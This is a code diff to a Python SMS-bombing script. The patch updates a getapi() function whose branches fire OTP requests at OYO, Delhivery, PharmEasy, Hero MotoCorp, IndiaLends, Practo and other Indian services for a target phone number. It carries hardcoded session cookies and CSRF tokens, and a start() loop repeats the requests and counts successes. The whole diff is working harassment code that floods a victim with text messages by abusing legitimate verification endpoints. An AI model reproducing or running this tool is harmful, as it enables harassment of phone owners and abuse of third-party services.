@@ -293,11 +293,9 @@ def checkinternet():
         banner()
         exit()
 
-
-def getapi(pn, lim, cc):
-    global country_codes
-    cc = str(cc).strip()
-    cnn = country_codes[cc]
+def getapi(pn,lim,cc):
+    cc=str(cc)
+    pn=str(pn)
     lim = int(lim)
     url = ["https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" +
            str(cc) + "&nod=4&phone=" + pn, "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + pn, "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + pn]
@@ -309,60 +307,98 @@ def getapi(pn, lim, cc):
         return False
     if lim == 3:
         headers = {
-        'Host': 'm.netmeds.com',
-        'content-length': '76',
-        'accept': '*/*',
-        'origin': 'https://m.netmeds.com',
-        'x-requested-with': 'XMLHttpRequest',
-        'save-data': 'on',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'referer': 'https://m.netmeds.com/customer/account/login/',
-        'accept-encoding': 'gzip, deflate, br',
-        'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
-        'cookie': '_ga=GA1.3.185497001.1558720330'}
+            'Host': 'pharmeasy.in',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Referer': 'https://pharmeasy.in/',
+            'Content-Type': 'application/json',
+            'Content-Length': '30',
+            'Connection': 'keep-alive',
+        }
+
+        data = {"contactNumber":pn}
+
+        response = requests.post('https://pharmeasy.in/api/auth/requestOTP', headers=headers, json=data)
+        return response.status_code==200
+    elif lim == 4:
+        cookies = {
+        '_ga': 'GA1.2.1273460610.1561191565',
+        '_gid': 'GA1.2.172574299.1561191565',
+        '_gcl_au': '1.1.833556660.1561191566',
+        '_fbp': 'fb.1.1561191568709.1707722126',
+        'PHPSESSID': 'm5tap7nr75b2ehcn8ur261oq86',
+        }
+        headers={
+            'Host': 'www.heromotocorp.com',
+            'Connection': 'keep-alive',
+            'Content-Length': '126',
+            'Accept': '*/*',
+            'Origin': 'https://www.heromotocorp.com',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Save-Data': 'on',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Referer': 'https://www.heromotocorp.com/en-in/xpulse200/',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
+            }
 
         data = {
-          'register_mobileno': pn,
-          'logintype': 'Otp',
-          'uniq_identy': 'quWqfunF',
-          'forget_pwd': 'N'
+          'mobile_no': pn,
+          'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=',
+          'mobile_no_otp': '',
+          'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'
         }
-        response = requests.post('https://m.netmeds.com/sociallogin/popup/nmsgetcode/', headers=headers, data=data)
-        return True
-    elif lim == 4:
-        headers = {
-        'Host': 'client-api.goomo.com',
-        'origin': 'https://www.goomo.com',
-        'client': 'm-web',
-        'x-goomo-platform': 'mWeb',
-        'dnt': '1',
-        'content-type': 'application/json',
-        'accept': '*/*',
-        'referer': 'https://www.goomo.com/hotels',
-        'accept-encoding': 'gzip, deflate, br',
-        'accept-language': 'en-US,en;q=0.9'}
 
-        data = {"email":"fakeemail@gmail.com","phone_number":pn,"country_code":cc}
+        response = requests.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data)
 
-        response = requests.post('https://client-api.goomo.com/v2/phone_confirmation/verify_user', headers=headers, json=data)
-        return True
+        return response.status_code==200
     elif lim == 5:
+        cookies = {
+            'Cookie:_ga': 'GA1.2.1483885314.1559157646',
+            '_fbp': 'fb.1.1559157647161.1989205138',
+            'TiPMix': '91.9909185226964',
+            'gcb_t_track': 'SEO - Google',
+            'gcb_t_keyword': '',
+            'gcb_t_l_url': 'https://www.google.com/',
+            'gcb_utm_medium': '',
+            'gcb_utm_campaign': '',
+            'ASP.NET_SessionId': 'ioqkek5lbgvldlq4i3cmijcs',
+            'web_app_landing_utm_source': '',
+            'web_app_landing_url': '/personal-loan',
+            'webapp_landing_referral_url': 'https://www.google.com/',
+            'ARRAffinity': '747e0c2664f5cb6179583963d834f4899eee9f6c8dcc773fc05ce45fa06b2417',
+            '_gid': 'GA1.2.969623705.1560660444',
+            '_gat': '1',
+            'current_url': 'https://indialends.com/personal-loan',
+            'cookies_plbt': '0',
+        }
+
         headers = {
-            'Accept': '*/*',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-US,en;q=0.5',
+            'Host': 'indialends.com',
             'Connection': 'keep-alive',
-            'Content-Length': '34',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Host': 'www.oriyamatrimony.com',
-            'Referer': 'https://www.oriyamatrimony.com/',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 8.1; Win64; x64; rv:59.0) Gecko/20 Firefox/56.0',
-            'X-Requested-With': 'XMLHttpRequest'}
+            'Content-Length': '75',
+            'Accept': '*/*',
+            'Origin': 'https://indialends.com',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Save-Data': 'on',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Referer': 'https://indialends.com/personal-loan',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
+        }
 
-        data = {'countrycode': cc, 'mobileno': pn}
+        data = {
+          'aeyder03teaeare': '1',
+          'ertysvfj74sje': cc,
+          'jfsdfu14hkgertd': pn,
+          'lj80gertdfg': '0'
+        }
 
-        response = requests.post('https://www.oriyamatrimony.com/login/mobileappsms-homepage.php', headers=headers, data=data)
+        response = requests.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', headers=headers, cookies=cookies, data=data)
         return True
     elif lim == 6:
         headers = {
@@ -457,7 +493,7 @@ def getapi(pn, lim, cc):
 
         data = {
           'client_name': 'Practo Android App',
-          'mobile': '+'+cc+91,
+          'mobile': '+'+cc+pn,
           'fingerprint': '',
           'device_name':'samsung+SM-G9350'}
         response = requests.post( "https://accounts.practo.com/send_otp", headers=headers, data=data)
@@ -709,7 +745,7 @@ def start(target, counter, delay, ch, cc):
         try:
             result = getapi(target, api, cc)
         except Exception:
-            result = False
+           result = False
         requested = requested + 1
         if result:
             success = success + 1
